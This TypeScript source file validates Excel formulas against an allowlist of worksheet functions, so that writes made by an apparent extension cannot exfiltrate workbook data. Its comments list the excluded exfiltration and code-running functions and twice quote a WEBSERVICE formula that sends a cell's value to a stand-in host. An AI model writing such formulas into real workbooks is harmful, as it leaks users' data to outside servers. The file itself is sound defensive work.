import { Err, Ok, type Result } from "@app/types/shared/result";
import { isNumberOrBoolean, isString } from "@app/types/shared/utils/general";
import type { ExcelArg } from "@extension/platforms/excel/tools/parseExpression";

// Excel reads a string that starts with one of these as a formula.
const FORMULA_STARTS: ReadonlySet<string> = new Set(["=", "+", "-"]);

// Every function that a formula can call. The list is the list of Microsoft, "Excel functions
// (alphabetical)", read on 2026-10-21, without the functions that the contracts below refuse.
//
// The functions that are left out, and the reason of each one:
//   - `WEBSERVICE` and `IMAGE` fetch a URL that the formula gives, so they send the cells to any
//     server.
//   - `TRANSLATE`, `DETECTLANGUAGE`, `COPILOT` and `PY` send the content of the cells to a
//     service of Microsoft. No other person reads that content, but it leaves the workbook, and
//     the user does not ask for it. `PY` runs its program in a container of Microsoft, and that
//     program has no access to the network or to the machine of the user.
//   - `STOCKHISTORY` stays in the list: what leaves the workbook is the name of a share and two
//     dates, and the answer comes from the service of Microsoft.
//   - The seven `CUBE*` functions send an expression that the formula builds to the server of a
//     cube, and give back what the server answers.
//   - `CELL` and `INFO` give data about the file and about the machine of the user, such as the
//     path of the file and the version of the operating system.
//   - `INDIRECT` makes a reference from text, and that reference can be in another workbook that
//     the user has open.
//   - `ENCODEURL` and `FILTERXML` fetch nothing themselves, but they have no use without
//     `WEBSERVICE`: one makes text safe for a URL, the other reads the XML that comes back.
//   - `RTD`, `CALL` and `REGISTER.ID` run code on the machine of the user.
//
// `HYPERLINK` stays in the list. The contract below says where the rule stops: a hyperlink needs
// a click of the user, and a write makes the same link without a formula.
//   - `MAP`, `BYROW`, `BYCOL`, `SCAN`, `REDUCE`, `MAKEARRAY`, `GROUPBY` and `PIVOTBY` take
//     another function.
/**
 * @cc [owner:matteotrab,label:security] allowed-functions-come-from-the-list-of-microsoft
 * `ALLOWED_FUNCTIONS` MUST hold only names of the list of worksheet functions of Microsoft. A
 * function of an add-in is not in that list, and a function of Excel that computes text as
 * a formula, such as `EVALUATE`, is not in it either. A formula can call no other name, because
 * the check refuses every name that this list does not hold.
 */
/**
 * @cc [owner:matteotrab,label:security] allowed-functions-stay-in-the-workbook
 * A function MUST NOT be in `ALLOWED_FUNCTIONS` when it does one of these four things:
 *   - It sends data to a server that the formula names, as `WEBSERVICE` and `IMAGE` do. Another
 *     person then reads the data of the workbook.
 *   - It sends the content of the cells to a service, even always the same service, as
 *     `COPILOT`, `TRANSLATE`, `DETECTLANGUAGE` and `PY` do. No other person reads that content,
 *     but it leaves the workbook, and the user does not ask for it.
 *   - It runs code on the machine of the user, as `RTD`, `CALL` and `REGISTER.ID` do.
 *   - It reads data of the user that is not in the workbook, as `CELL` and `INFO` read the path
 *     of the file and the machine, and as `INDIRECT` reads another workbook that is open.
 *
 * A function that only brings public data in, as `STOCKHISTORY` does, is not refused: what
 * leaves the workbook is the name of a share, and no other person reads it. The names above are
 * examples of each case, and not the complete list: the rule applies to every function that
 * Microsoft adds later and that does one of these four things.
 *
 * The rule stops at an action of the user. `HYPERLINK` makes a link to a server that the
 * formula names, and the data of that link goes out when the user clicks it. It stays in the
 * list, because a write can make the same link without a formula, with the `hyperlink` property
 * of a range. To refuse the link, the check of the arguments must refuse that property too.
 */
/**
 * @cc [owner:matteotrab,label:security] allowed-functions-take-no-function
 * A function MUST NOT be in `ALLOWED_FUNCTIONS` when it takes another function as an argument,
 * as `MAP`, `BYROW`, `BYCOL`, `SCAN`, `REDUCE`, `MAKEARRAY`, `GROUPBY` and `PIVOTBY` do. Excel
 * accepts the name of a function alone there, as in `MAP(A1, WEBSERVICE)`, and a name alone is
 * not a call, so `CALLS` does not read it. These names are examples of the rule, and not the
 * complete list. `LAMBDA` is not such a function: a lambda that is called where it is written,
 * `=LAMBDA(x, x+1)(A1)`, carries its body in the formula, and every call of that body ends with
 * `(`.
 */
const ALLOWED_FUNCTIONS: ReadonlySet<string> = new Set([
  "ABS",
  "ACCRINT",
  "ACCRINTM",
  "ACOS",
  "ACOSH",
  "ACOT",
  "ACOTH",
  "ADDRESS",
  "AGGREGATE",
  "AMORDEGRC",
  "AMORLINC",
  "AND",
  "ARABIC",
  "AREAS",
  "ARRAYTOTEXT",
  "ASC",
  "ASIN",
  "ASINH",
  "ATAN",
  "ATAN2",
  "ATANH",
  "AVEDEV",
  "AVERAGE",
  "AVERAGEA",
  "AVERAGEIF",
  "AVERAGEIFS",
  "BAHTTEXT",
  "BASE",
  "BESSELI",
  "BESSELJ",
  "BESSELK",
  "BESSELY",
  "BETA.DIST",
  "BETA.INV",
  "BETADIST",
  "BETAINV",
  "BIN2DEC",
  "BIN2HEX",
  "BIN2OCT",
  "BINOM.DIST",
  "BINOM.DIST.RANGE",
  "BINOM.INV",
  "BINOMDIST",
  "BITAND",
  "BITLSHIFT",
  "BITOR",
  "BITRSHIFT",
  "BITXOR",
  "CEILING",
  "CEILING.MATH",
  "CEILING.PRECISE",
  "CHAR",
  "CHIDIST",
  "CHIINV",
  "CHISQ.DIST",
  "CHISQ.DIST.RT",
  "CHISQ.INV",
  "CHISQ.INV.RT",
  "CHISQ.TEST",
  "CHITEST",
  "CHOOSE",
  "CHOOSECOLS",
  "CHOOSEROWS",
  "CLEAN",
  "CODE",
  "COLUMN",
  "COLUMNS",
  "COMBIN",
  "COMBINA",
  "COMPLEX",
  "CONCAT",
  "CONCATENATE",
  "CONFIDENCE",
  "CONFIDENCE.NORM",
  "CONFIDENCE.T",
  "CONVERT",
  "CORREL",
  "COS",
  "COSH",
  "COT",
  "COTH",
  "COUNT",
  "COUNTA",
  "COUNTBLANK",
  "COUNTIF",
  "COUNTIFS",
  "COUPDAYBS",
  "COUPDAYS",
  "COUPDAYSNC",
  "COUPNCD",
  "COUPNUM",
  "COUPPCD",
  "COVAR",
  "COVARIANCE.P",
  "COVARIANCE.S",
  "CRITBINOM",
  "CSC",
  "CSCH",
  "CUMIPMT",
  "CUMPRINC",
  "DATE",
  "DATEDIF",
  "DATEVALUE",
  "DAVERAGE",
  "DAY",
  "DAYS",
  "DAYS360",
  "DB",
  "DBCS",
  "DCOUNT",
  "DCOUNTA",
  "DDB",
  "DEC2BIN",
  "DEC2HEX",
  "DEC2OCT",
  "DECIMAL",
  "DEGREES",
  "DELTA",
  "DEVSQ",
  "DGET",
  "DISC",
  "DMAX",
  "DMIN",
  "DOLLAR",
  "DOLLARDE",
  "DOLLARFR",
  "DPRODUCT",
  "DROP",
  "DSTDEV",
  "DSTDEVP",
  "DSUM",
  "DURATION",
  "DVAR",
  "DVARP",
  "ECMA.CEILING",
  "EDATE",
  "EFFECT",
  "EOMONTH",
  "ERF",
  "ERF.PRECISE",
  "ERFC",
  "ERFC.PRECISE",
  "ERROR.TYPE",
  "EUROCONVERT",
  "EVEN",
  "EXACT",
  "EXP",
  "EXPAND",
  "EXPON.DIST",
  "EXPONDIST",
  "F.DIST",
  "F.DIST.RT",
  "F.INV",
  "F.INV.RT",
  "F.TEST",
  "FACT",
  "FACTDOUBLE",
  "FALSE",
  "FDIST",
  "FILTER",
  "FIND",
  "FINDB",
  "FINV",
  "FISHER",
  "FISHERINV",
  "FIXED",
  "FLOOR",
  "FLOOR.MATH",
  "FLOOR.PRECISE",
  "FORECAST",
  "FORECAST.ETS",
  "FORECAST.ETS.CONFINT",
  "FORECAST.ETS.SEASONALITY",
  "FORECAST.ETS.STAT",
  "FORECAST.LINEAR",
  "FORMULATEXT",
  "FREQUENCY",
  "FTEST",
  "FV",
  "FVSCHEDULE",
  "GAMMA",
  "GAMMA.DIST",
  "GAMMA.INV",
  "GAMMADIST",
  "GAMMAINV",
  "GAMMALN",
  "GAMMALN.PRECISE",
  "GAUSS",
  "GCD",
  "GEOMEAN",
  "GESTEP",
  "GETPIVOTDATA",
  "GROWTH",
  "HARMEAN",
  "HEX2BIN",
  "HEX2DEC",
  "HEX2OCT",
  "HLOOKUP",
  "HOUR",
  "HSTACK",
  "HYPERLINK",
  "HYPGEOM.DIST",
  "HYPGEOMDIST",
  "IF",
  "IFERROR",
  "IFNA",
  "IFS",
  "IMABS",
  "IMAGINARY",
  "IMARGUMENT",
  "IMCONJUGATE",
  "IMCOS",
  "IMCOSH",
  "IMCOT",
  "IMCSC",
  "IMCSCH",
  "IMDIV",
  "IMEXP",
  "IMLN",
  "IMLOG10",
  "IMLOG2",
  "IMPOWER",
  "IMPRODUCT",
  "IMREAL",
  "IMSEC",
  "IMSECH",
  "IMSIN",
  "IMSINH",
  "IMSQRT",
  "IMSUB",
  "IMSUM",
  "IMTAN",
  "INDEX",
  "INT",
  "INTERCEPT",
  "INTRATE",
  "IPMT",
  "IRR",
  "ISBLANK",
  "ISERR",
  "ISERROR",
  "ISEVEN",
  "ISFORMULA",
  "ISLOGICAL",
  "ISNA",
  "ISNONTEXT",
  "ISNUMBER",
  "ISO.CEILING",
  "ISODD",
  "ISOMITTED",
  "ISOWEEKNUM",
  "ISPMT",
  "ISREF",
  "ISTEXT",
  "JIS",
  "KURT",
  "LAMBDA",
  "LARGE",
  "LCM",
  "LEFT",
  "LEFTB",
  "LEN",
  "LENB",
  "LET",
  "LINEST",
  "LN",
  "LOG",
  "LOG10",
  "LOGEST",
  "LOGINV",
  "LOGNORM.DIST",
  "LOGNORM.INV",
  "LOGNORMDIST",
  "LOOKUP",
  "LOWER",
  "MATCH",
  "MAX",
  "MAXA",
  "MAXIFS",
  "MDETERM",
  "MDURATION",
  "MEDIAN",
  "MID",
  "MIDB",
  "MIN",
  "MINA",
  "MINIFS",
  "MINUTE",
  "MINVERSE",
  "MIRR",
  "MMULT",
  "MOD",
  "MODE",
  "MODE.MULT",
  "MODE.SNGL",
  "MONTH",
  "MROUND",
  "MULTINOMIAL",
  "MUNIT",
  "N",
  "NA",
  "NEGBINOM.DIST",
  "NEGBINOMDIST",
  "NETWORKDAYS",
  "NETWORKDAYS.INTL",
  "NOMINAL",
  "NORM.DIST",
  "NORM.INV",
  "NORM.S.DIST",
  "NORM.S.INV",
  "NORMDIST",
  "NORMINV",
  "NORMSDIST",
  "NORMSINV",
  "NOT",
  "NOW",
  "NPER",
  "NPV",
  "NUMBERVALUE",
  "OCT2BIN",
  "OCT2DEC",
  "OCT2HEX",
  "ODD",
  "ODDFPRICE",
  "ODDFYIELD",
  "ODDLPRICE",
  "ODDLYIELD",
  "OFFSET",
  "OR",
  "PDURATION",
  "PEARSON",
  "PERCENTILE",
  "PERCENTILE.EXC",
  "PERCENTILE.INC",
  "PERCENTOF",
  "PERCENTRANK",
  "PERCENTRANK.EXC",
  "PERCENTRANK.INC",
  "PERMUT",
  "PERMUTATIONA",
  "PHI",
  "PHONETIC",
  "PI",
  "PMT",
  "POISSON",
  "POISSON.DIST",
  "POWER",
  "PPMT",
  "PRICE",
  "PRICEDISC",
  "PRICEMAT",
  "PROB",
  "PRODUCT",
  "PROPER",
  "PV",
  "QUARTILE",
  "QUARTILE.EXC",
  "QUARTILE.INC",
  "QUOTIENT",
  "RADIANS",
  "RAND",
  "RANDARRAY",
  "RANDBETWEEN",
  "RANK",
  "RANK.AVG",
  "RANK.EQ",
  "RATE",
  "RECEIVED",
  "REGEXEXTRACT",
  "REGEXREPLACE",
  "REGEXTEST",
  "REPLACE",
  "REPLACEB",
  "REPT",
  "RIGHT",
  "RIGHTB",
  "ROMAN",
  "ROUND",
  "ROUNDDOWN",
  "ROUNDUP",
  "ROW",
  "ROWS",
  "RRI",
  "RSQ",
  "SEARCH",
  "SEARCHB",
  "SEC",
  "SECH",
  "SECOND",
  "SEQUENCE",
  "SERIESSUM",
  "SHEET",
  "SHEETS",
  "SIGN",
  "SIN",
  "SINH",
  "SKEW",
  "SKEW.P",
  "SLN",
  "SLOPE",
  "SMALL",
  "SORT",
  "SORTBY",
  "SQRT",
  "SQRTPI",
  "STANDARDIZE",
  "STDEV",
  "STDEV.P",
  "STDEV.S",
  "STDEVA",
  "STDEVP",
  "STDEVPA",
  "STEYX",
  "STOCKHISTORY",
  "SUBSTITUTE",
  "SUBTOTAL",
  "SUM",
  "SUMIF",
  "SUMIFS",
  "SUMPRODUCT",
  "SUMSQ",
  "SUMX2MY2",
  "SUMX2PY2",
  "SUMXMY2",
  "SWITCH",
  "SYD",
  "T",
  "T.DIST",
  "T.DIST.2T",
  "T.DIST.RT",
  "T.INV",
  "T.INV.2T",
  "T.TEST",
  "TAKE",
  "TAN",
  "TANH",
  "TBILLEQ",
  "TBILLPRICE",
  "TBILLYIELD",
  "TDIST",
  "TEXT",
  "TEXTAFTER",
  "TEXTBEFORE",
  "TEXTJOIN",
  "TEXTSPLIT",
  "TIME",
  "TIMEVALUE",
  "TINV",
  "TOCOL",
  "TODAY",
  "TOROW",
  "TRANSPOSE",
  "TREND",
  "TRIM",
  "TRIMMEAN",
  "TRIMRANGE",
  "TRUE",
  "TRUNC",
  "TTEST",
  "TYPE",
  "UNICHAR",
  "UNICODE",
  "UNIQUE",
  "UPPER",
  "USDOLLAR",
  "VALUE",
  "VALUETOTEXT",
  "VAR",
  "VAR.P",
  "VAR.S",
  "VARA",
  "VARP",
  "VARPA",
  "VDB",
  "VLOOKUP",
  "VSTACK",
  "WEEKDAY",
  "WEEKNUM",
  "WEIBULL",
  "WEIBULL.DIST",
  "WORKDAY",
  "WORKDAY.INTL",
  "WRAPCOLS",
  "WRAPROWS",
  "XIRR",
  "XLOOKUP",
  "XMATCH",
  "XNPV",
  "XOR",
  "YEAR",
  "YEARFRAC",
  "YIELD",
  "YIELDDISC",
  "YIELDMAT",
  "Z.TEST",
  "ZTEST",
]);

// Matches a call: a name, then "(". The check reads the name. A name can hold a dot, as in
// `NETWORKDAYS.INTL(`. In `=IF(A1>0,SUM(B:B),0)`, the check reads `IF` and `SUM`.
const CALLS = /(?:^|[^\p{L}\p{N}_.])([\p{L}_][\p{L}\p{N}_.]*)\s*\(/giu;

// A text of a formula is between double quotes, `="a b"`. A sheet name is between single
// quotes, `='My Sheet'!A1`.
type QuoteType = "double" | "single";

// Finds the end of a text or of a sheet name in a formula. `quoteType` says which of the two to
// find, and `start` is the index of the quote that opens it.
//
// The part ends at the next quote that is alone. Two quotes together are one quote inside the
// part, and not its end: `="a ""b"" c"` and `='It''s here'!A1`.
//
// The function gives the index of the first character after the part. If the part does not
// close, the function gives `null`.
function endOfQuotedPart({
  formula,
  start,
  quoteType,
}: {
  formula: string;
  start: number;
  quoteType: QuoteType;
}): number | null {
  const quote = quoteType === "double" ? '"' : "'";
  for (let index = start + 1; index < formula.length; index++) {
    if (formula[index] !== quote) {
      continue;
    }
    if (formula[index + 1] === quote) {
      index++;
      continue;
    }
    return index + 1;
  }
  return null;
}

// Finds the end of a structured reference in a formula. A structured reference is between
// brackets: `=T[Sales]`. `start` is the index of the bracket that opens the reference.
//
// A structured reference can hold a second one: `=T[[x"y]]`. For this reason the function counts
// the brackets. In a reference, an apostrophe removes the special function of the next
// character, and that character can be a bracket: `=T['#a]` and `=T[']a]`.
//
// The function gives the index of the first character after the reference. If the reference does
// not close, the function gives `null`.
function endOfReference({
  formula,
  start,
}: {
  formula: string;
  start: number;
}): number | null {
  let brackets = 0;
  for (let index = start; index < formula.length; index++) {
    switch (formula[index]) {
      // An apostrophe removes the special function of the next character, a bracket included.
      case "'":
        index++;
        break;
      case "[":
        brackets++;
        break;
      case "]":
        brackets--;
        if (brackets === 0) {
          return index + 1;
        }
        break;
    }
  }
  return null;
}

/**
 * Removes the parts of a formula that Excel does not compute, and gives the rest.
 *
 * The check must read only the names that the formula calls. A formula can hold a name in a
 * part that Excel does not compute, and the check must not read that name. There are three
 * parts of this type:
 *   - a text: `="a SUM(1) b"`
 *   - a sheet name: `='My Sheet (1)'!A1`
 *   - a structured reference: `=T[Sales]`
 *
 * Each part ends in a different way:
 *   - A text ends at a double quote. But `""` is one double quote of the text: `="a ""b"" c"`.
 *   - A sheet name ends at a single quote. But `''` is one single quote of the name:
 *     `='It''s here'!A1`.
 *   - A structured reference ends at a bracket. In the reference, an apostrophe removes the
 *     special function of the next character, and a double quote has no special function:
 *     `=T['#a]` and `=T[[x"y]]`.
 */
function removeQuotedAndBracketedParts(
  formula: string
): Result<string, string> {
  let rest = "";
  let index = 0;
  while (index < formula.length) {
    let end: number | null;
    switch (formula[index]) {
      case '"':
        end = endOfQuotedPart({ formula, start: index, quoteType: "double" });
        break;
      case "'":
        end = endOfQuotedPart({ formula, start: index, quoteType: "single" });
        break;
      case "[":
        end = endOfReference({ formula, start: index });
        break;
      default:
        rest += formula[index];
        index++;
        continue;
    }
    if (end === null) {
      return new Err(
        `a quote or a bracket is never closed. The formula is "${formula}".`
      );
    }
    index = end;
  }
  return new Ok(rest);
}
/**
 * Checks the functions that one string calls, when Excel reads that string as a formula.
 *
 * The check has three steps:
 *   1. If Excel reads the string as text, allow it. Only a string that starts with `=`, `+` or
 *      `-` is a formula.
 *   2. Remove the parts of the formula that Excel does not compute, such as a text.
 *   3. Read every name that has a `(` after it, because that name is a call. Refuse a name
 *      that is not in `ALLOWED_FUNCTIONS`.
 *
 * Examples:
 *   - `=SUM(A1:A2)*2` is allowed.
 *   - `January` is allowed: Excel reads it as text.
 *   - `=WEBSERVICE("https://example.com/?d="&A1)` is refused: it fetches a URL.
 *   - `=CONTOSO.GETDATA(A1)` is refused: the function is in an add-in, outside Excel.
 *   - `=ВЕБСЛУЖБА(A1)` is refused: it is `WEBSERVICE` in Russian Excel, and no name of
 *     `ALLOWED_FUNCTIONS` is translated.
 *   - `="total ("&A1&")"` is allowed: `total (` is in the text of the formula, which Excel does
 *     not compute.
 *   - `=SUM(T['#a])+WEBSERVICE("https://example.com/?d="&A1)` is refused: the apostrophe of the
 *     structured reference does not open a name, so the call is read.
 */
function checkFormulaFunctions(value: string): Result<undefined, string> {
  if (!FORMULA_STARTS.has(value.trimStart().charAt(0))) {
    return new Ok(undefined);
  }
  const computed = removeQuotedAndBracketedParts(value);
  if (computed.isErr()) {
    return computed;
  }
  for (const [, name] of computed.value.matchAll(CALLS)) {
    if (name && !ALLOWED_FUNCTIONS.has(name.toUpperCase())) {
      return new Err(
        `"${name}" is not an allowed function. The formula is "${value}".`
      );
    }
  }
  return new Ok(undefined);
}

/**
 * Checks every formula that an argument of a write carries.
 *
 * A formula does not come only from the `formulas` property. Some arguments are a formula by
 * design, and the write of such a formula is correct work:
 *   - `names.add('Total', '=SUM(Sheet1!A:A)')`: the reference of a name is a formula.
 *   - `changeRuleToCustom('=A1>100')`: the rule of a conditional format is a formula.
 *   - `set({ dataValidation: { rule: { custom: { formula: '=AND(A1>0)' } } } })`.
 *   - `setFormula('=Sheet1!A1')` on the title of a chart.
 *
 * And `values` writes a formula, although that is not its purpose: Excel reads a string that
 * starts with `=`, `+` or `-` as a formula.
 *
 * For these two reasons, the check reads every string of the arguments. It does not look at the
 * name of the property.
 */
export function checkFormulasInArgument(
  arg: ExcelArg
): Result<undefined, string> {
  if (isString(arg)) {
    return checkFormulaFunctions(arg);
  }
  // A number and a boolean hold no text, so Excel cannot read them as a formula. What stays is
  // an array or an object, and both hold other arguments.
  if (isNumberOrBoolean(arg)) {
    return new Ok(undefined);
  }
  for (const value of Object.values(arg)) {
    const check = checkFormulasInArgument(value);
    if (check.isErr()) {
      return check;
    }
  }
  return new Ok(undefined);
}
